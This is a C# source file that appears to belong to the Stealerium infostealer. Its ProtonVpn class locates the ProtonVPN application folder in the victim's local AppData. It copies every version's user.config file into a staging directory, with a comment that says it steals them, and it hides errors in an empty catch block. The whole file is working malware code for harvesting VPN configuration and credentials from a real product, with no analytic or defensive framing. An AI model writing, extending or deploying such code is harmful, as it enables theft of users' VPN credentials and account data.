using System;
using System.IO;
using Stealerium.Helpers;

namespace Stealerium.Target.VPN
{
    internal sealed class ProtonVpn
    {
        // Save("ProtonVPN");
        public static void Save(string sSavePath)
        {
            // "ProtonVPN" directory path
            var vpn = Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData),
                "ProtonVPN");
            // Stop if not exists
            if (!Directory.Exists(vpn))
                return;
            try
            {
                // Steal user.config files
                foreach (var dir in Directory.GetDirectories(vpn))
                    if (dir.Contains("ProtonVPN.exe"))
                        foreach (var version in Directory.GetDirectories(dir))
                        {
                            var configLocation = version + "\\user.config";
                            var copyDirectory = Path.Combine(
                                sSavePath, new DirectoryInfo(Path.GetDirectoryName(configLocation)).Name);
                            if (Directory.Exists(copyDirectory)) continue;
                            Counter.Vpn++;
                            Directory.CreateDirectory(copyDirectory);
                            File.Copy(configLocation, copyDirectory + "\\user.config");
                        }
            }
            catch
            {
                // ignored
            }
        }
    }
}